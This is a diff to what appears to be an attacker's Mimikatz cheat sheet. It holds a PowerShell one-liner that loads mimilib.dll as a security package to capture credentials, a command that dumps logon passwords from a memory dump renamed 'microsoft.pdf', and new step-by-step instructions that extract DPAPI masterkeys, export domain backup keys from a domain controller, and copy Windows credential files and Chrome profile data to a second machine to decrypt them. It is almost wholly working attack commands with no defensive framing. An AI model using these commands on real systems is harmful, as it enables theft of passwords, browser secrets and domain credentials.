@@ -73,10 +73,42 @@ sekurlsa::pth /user:<USERNAME wihtout DOMAIN> /domain:<FULLY QUALIFIED DOMAIN NA
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
-$DllName= (Get-Item -Path ".\").FullName + "\mimilib.dll";$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2');$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly,[Reflection.Emit.AssemblyBuilderAccess]::Run);$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2',$False);$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32','Public, Class');$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage','secur32.dll','Public,Static',[Reflection.CallingConventions]::Standard,[Int32],[Type[]] @([String], [IntPtr]),[Runtime.InteropServices.CallingConvention]::Winapi,[Runtime.InteropServices.CharSet]::Auto);$Secur32 = $TypeBuilder.CreateType();if([IntPtr]::Size -eq 4){$StructSize = 20}else{$StructSize = 24};$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize);[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr,$StructSize);$RuntimeSuccess = $True;$Result = $Secur32::AddSecurityPackage($DllName,$StructPtr);
+mimikatz.exe "sekurlsa::minidump microsoft.pdf" sekurlsa::logonPasswords exit
 
 ----------------------------------------------------------------------------------------------------------------------------------------
 
-mimikatz.exe "sekurlsa::minidump microsoft.pdf" sekurlsa::logonPasswords exit
+Machine A:
+
+For same logged-in user:
+dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\812b1791-73e2-4e58-b67f-5ce4891a79cd" /rpc
+(or)
+From Admin for different user in the same machine:
+dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\9c08e1e4-8719-4479-b104-875d3a02e6e7" /rpc
+dpapi::cache /load
+lsadump::backupkeys /system:<DOMAIN CONTROLLER or DOMAIN FQDN> /export
+dpapi::cache /load
+dpapi::masterkey /in:"C:\Users\user01\AppData\Roaming\Microsoft\Protect\S-1-5-21-SOME-RANDOM-NUMBERS-1165\9c08e1e4-8719-4479-b104-875d3a02e6e7" /rpc
+
+Copy the cred file from C:\Users\user01\AppData\Local\Microsoft\Credentials\<1 KB FILE not the file more than 10 KB>
+
+Copy files for Chrome:
+C:\Users\user01\AppData\Local\Google\Chrome\User Data\Local State
+C:\Users\user01\AppData\Local\Google\Chrome\User Data\Default\<ALL FILES except FOLDERS>
+
+Machine B:
+
+dpapi::create /guid:{9c08e1e4-8719-4479-b104-875d3a02e6e7} /key:<KEY FROM dpapi::masterkey> /password:<NEW PASSWORD> /protected
+
+Place the newly generated file to %appdata%\Microsoft\Protect\<SID FOLDER>\
+
+Also, place the copied cred file to %localappdata%\Microsoft\Credentials\
+
+Also, place the chrome files in respective locations:
+%localappdata%\Google\Chrome\User Data\Local State
+%localappdata%\Google\Chrome\User Data\Default\<ALL FILES except FOLDERS>
+
+----------------------------------------------------------------------------------------------------------------------------------------
+
+$DllName= (Get-Item -Path ".\").FullName + "\mimilib.dll";$DynAssembly = New-Object System.Reflection.AssemblyName('SSPI2');$AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly,[Reflection.Emit.AssemblyBuilderAccess]::Run);$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('SSPI2',$False);$TypeBuilder = $ModuleBuilder.DefineType('SSPI2.Secur32','Public, Class');$PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('AddSecurityPackage','secur32.dll','Public,Static',[Reflection.CallingConventions]::Standard,[Int32],[Type[]] @([String], [IntPtr]),[Runtime.InteropServices.CallingConvention]::Winapi,[Runtime.InteropServices.CharSet]::Auto);$Secur32 = $TypeBuilder.CreateType();if([IntPtr]::Size -eq 4){$StructSize = 20}else{$StructSize = 24};$StructPtr = [Runtime.InteropServices.Marshal]::AllocHGlobal($StructSize);[Runtime.InteropServices.Marshal]::WriteInt32($StructPtr,$StructSize);$RuntimeSuccess = $True;$Result = $Secur32::AddSecurityPackage($DllName,$StructPtr);
 
 ----------------------------------------------------------------------------------------------------------------------------------------
